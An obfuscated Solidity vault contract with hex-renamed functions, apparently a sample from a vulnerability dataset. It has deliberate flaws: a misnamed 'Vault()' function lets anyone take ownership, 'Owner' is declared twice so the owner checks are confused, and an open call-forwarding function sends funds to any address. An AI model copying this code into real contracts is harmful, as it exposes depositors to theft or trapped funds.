pragma solidity ^0.4.23;

contract Proxy  {
    modifier _0x62bf21 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0xa8ad21(address _0x66ef2c) public _0x62bf21 { Owner = _0x66ef2c; }
    function _0xb503ff(address _0x4ebaa3, bytes data) public payable {
        _0x4ebaa3.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0xdcbe7a();
        }
    }

    function _0xdcbe7a() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x217b30(uint256 _0x99b834) public _0x62bf21 {
        if (_0x99b834>0 && Deposits[msg.sender]>=_0x99b834) {
            msg.sender.transfer(_0x99b834);
        }
    }
}